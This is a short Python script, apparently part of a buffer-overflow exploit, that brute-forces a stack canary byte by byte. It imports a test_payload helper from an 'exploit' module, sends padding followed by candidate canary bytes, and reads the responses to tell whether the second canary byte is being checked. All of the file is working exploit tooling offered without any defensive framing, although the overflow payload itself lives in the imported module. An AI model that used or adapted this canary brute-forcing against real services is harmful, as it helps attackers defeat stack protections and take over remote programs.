import socket
import ssl
import sys
import time
from exploit import test_payload, BUF_TO_CANARY # Reuse logic

print("Testing Byte 1...")

# Assume byte 0 is 00 (confirmed)
known = b"\x00"

# Case 1: 00 00
p1 = b"A"*BUF_TO_CANARY + known + b"\x00"
res1 = test_payload(p1)
print(f"Payload 00 00: {res1} (Expected True)")

# Case 2: 00 01
p2 = b"A"*BUF_TO_CANARY + known + b"\x01"
res2 = test_payload(p2)
print(f"Payload 00 01: {res2} (Expected False)")

if res1 and res2:
    print("CONCLUSION: Both passed. We are NOT checking byte 1.")
    print("Maybe byte 1 is not at offset 41? Or check is broken.")
elif res1 and not res2:
    print("CONCLUSION: Byte 1 check is ACTIVE and correct byte is 00.")
else:
    print("CONCLUSION: Something else weird.")
